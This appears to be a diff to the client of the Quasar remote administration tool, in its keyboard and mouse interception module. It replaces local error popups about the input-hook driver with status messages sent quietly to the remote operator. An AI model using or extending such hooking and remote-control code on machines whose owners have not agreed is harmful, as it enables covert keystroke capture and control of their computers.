@@ -7,6 +7,8 @@ using Quasar.Client.Utilities;
 using InputInterceptorNS;
 using System.Windows.Forms;
 using System.ServiceModel.Channels;
+using Quasar.Common.Networking;
+using Quasar.Common.Messages;
 
 namespace Quasar.Client.Interception
 {
@@ -148,7 +150,7 @@ namespace Quasar.Client.Interception
         public static MouseHook mouseHook;
         public static KeyboardHook keyboardHook;
 
-        public static  Boolean InitializeDriver()
+        public static  Boolean InitializeDriver(ISender client)
         {
             if (InputInterceptor.CheckDriverInstalled())
             {
@@ -158,9 +160,9 @@ namespace Quasar.Client.Interception
                     keyboardHook = new KeyboardHook(null);
                     return true;
                 }
-                MessageBox.Show("driver initialization failed.");
+                client.Send(new SetStatus { Message = "KB/M driver initialization failed!" });
             }
-            else MessageBox.Show("driver is not installed");
+            else client.Send(new SetStatus { Message = "KB/M driver is not installed!" });
             return false;
         }
 
